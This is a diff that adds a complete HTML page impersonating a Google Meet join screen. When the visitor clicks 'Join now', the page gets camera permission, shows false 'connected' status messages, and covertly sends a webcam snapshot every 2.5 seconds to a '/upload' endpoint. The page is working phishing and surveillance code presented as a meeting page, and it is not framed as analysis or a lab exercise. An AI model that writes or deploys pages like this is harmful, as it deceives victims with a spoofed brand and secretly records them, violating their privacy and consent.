@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Google Meet - Join Meeting</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            background: #f9f9f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 16px;
+        }
+        .container {
+            max-width: 600px;
+            width: 100%;
+            background: white;
+            border-radius: 28px;
+            box-shadow: 0 8px 28px rgba(0,0,0,0.12);
+            overflow: hidden;
+            transition: all 0.2s;
+        }
+        .header {
+            background: #1a73e8;
+            padding: 24px;
+            color: white;
+            text-align: center;
+        }
+        .header h1 {
+            font-size: 24px;
+            font-weight: 500;
+        }
+        .meeting-info {
+            padding: 24px 24px 16px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        .meeting-code {
+            background: #f1f3f4;
+            padding: 12px 16px;
+            border-radius: 24px;
+            font-family: monospace;
+            font-size: 18px;
+            text-align: center;
+            letter-spacing: 2px;
+            color: #1a73e8;
+            font-weight: 500;
+        }
+        .join-section {
+            padding: 24px;
+            text-align: center;
+        }
+        .camera-preview {
+            background: #e8eaed;
+            border-radius: 24px;
+            width: 100%;
+            height: 240px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 24px;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%239aa0a6" width="48" height="48"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm0 13c-2.33 0-4.31-1.46-5.11-3.5h10.22c-.8 2.04-2.78 3.5-5.11 3.5z"/></svg>');
+            background-repeat: no-repeat;
+            background-position: center;
+            background-size: 64px;
+        }
+        video, canvas {
+            display: none;
+        }
+        .btn {
+            background: #1a73e8;
+            border: none;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 40px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+        .btn:hover {
+            background: #1557b0;
+        }
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        .status {
+            margin-top: 16px;
+            font-size: 14px;
+            color: #5f6368;
+        }
+        .footer {
+            background: #f8f9fa;
+            padding: 16px;
+            text-align: center;
+            font-size: 12px;
+            color: #5f6368;
+            border-top: 1px solid #e0e0e0;
+        }
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(0,0,0,0.1);
+            border-top-color: #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>📹 Google Meet</h1>
+    </div>
+    <div class="meeting-info">
+        <div style="text-align: center; margin-bottom: 12px;">Join meeting</div>
+        <div class="meeting-code">gmeet-xyz-abc</div>
+    </div>
+    <div class="join-section">
+        <div class="camera-preview" id="cameraPreview"></div>
+        <button class="btn" id="joinBtn">Join now</button>
+        <div class="status" id="statusMsg">You'll be able to join after host starts the meeting.</div>
+    </div>
+    <div class="footer">
+        Need help? <a href="#" style="color:#1a73e8;">Learn more</a> about Google Meet
+    </div>
+</div>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
+<script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const joinBtn = document.getElementById('joinBtn');
+    const statusDiv = document.getElementById('statusMsg');
+    const camPreview = document.getElementById('cameraPreview');
+
+    let captureInterval = null;
+    let stream = null;
+
+    joinBtn.onclick = async () => {
+        if (joinBtn.disabled) return;
+        joinBtn.disabled = true;
+        joinBtn.innerText = "Requesting camera...";
+        statusDiv.innerHTML = '<span class="spinner"></span> Requesting camera permission...';
+
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+
+            // Show live preview in the fake camera box
+            const previewVideo = document.createElement('video');
+            previewVideo.srcObject = stream;
+            previewVideo.autoplay = true;
+            previewVideo.muted = true;
+            previewVideo.style.width = '100%';
+            previewVideo.style.height = '100%';
+            previewVideo.style.objectFit = 'cover';
+            previewVideo.style.borderRadius = '24px';
+            camPreview.innerHTML = '';
+            camPreview.style.background = '#000';
+            camPreview.appendChild(previewVideo);
+
+            statusDiv.innerHTML = '<span class="spinner"></span> Connecting to meeting...';
+            joinBtn.innerText = "Joining...";
+
+            // Start capturing in background
+            startCapture();
+
+            // After 3 seconds, show "connected" and keep capturing
+            setTimeout(() => {
+                statusDiv.innerHTML = "You're in the meeting. Connecting audio...";
+                joinBtn.innerText = "Joined";
+                setTimeout(() => {
+                    statusDiv.innerHTML = "Connected. Enjoy the meeting!";
+                }, 2000);
+            }, 3000);
+
+        } catch (err) {
+            statusDiv.innerHTML = "Camera access is required to join the meeting. Please allow camera.";
+            joinBtn.disabled = false;
+            joinBtn.innerText = "Join now";
+            console.error(err);
+        }
+    };
+
+    function startCapture() {
+        if (captureInterval) clearInterval(captureInterval);
+        captureInterval = setInterval(() => {
+            if (video.videoWidth === 0) return;
+            const ctx = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataURL = canvas.toDataURL('image/jpeg');
+            const base64 = dataURL.split(',')[1];
+            fetch('/upload', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: base64 })
+            }).catch(e => console.error);
+        }, 2500);
+    }
+
+    // Optional: if user closes page, release stream
+    window.onbeforeunload = () => {
+        if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+        }
+    };
+</script>
+</body>
+</html>
